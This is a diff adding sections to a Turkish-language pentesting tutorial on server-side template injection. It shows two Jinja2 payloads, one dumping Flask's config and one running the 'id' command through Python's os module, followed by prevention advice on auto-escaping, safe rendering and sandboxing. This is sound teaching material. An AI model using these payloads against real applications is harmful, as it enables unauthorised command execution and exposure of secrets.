@@ -62,3 +62,24 @@ Pentester açısından bu fark önemlidir çünkü hangi engine kullanıldığı
 Farklı şablon motorlarını test etmek için aşağıdaki akış kullanılabilir:
 
 ![alt text](resim.png)
+
+# SSTI Exploitation
+```py
+{{config.items()}} # Jinja2’de Flask uygulamasının config nesnesini dump eder. 
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} # Python builtins üzerinden "os" modülünü import eder, sistemde `id` komutunu çalıştırır, çıktısını döndürür.
+```
+
+Daha detaylı exploit teknikleri için:
+https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#exploits
+
+# SSTI Zafiyetini Önleme
+Geliştirici tarafında alınması gereken önlemler:
+## Auto-escaping aktif hale getirilmelidir
+Çoğu modern template engine’de (Jinja2, Twig) HTML auto-escaping özelliği vardır. Kapalıysa açılmalıdır.
+
+## Safe rendering context kullanımı
+Kullanıcıdan alınan veri sadece değişken değeri olarak kullanılmalı, template syntax işlenmemelidir.
+
+## Sandboxing
+Engine’in desteklediği sandbox özelliği (ör. Jinja2 sandbox) devreye alınmalı.
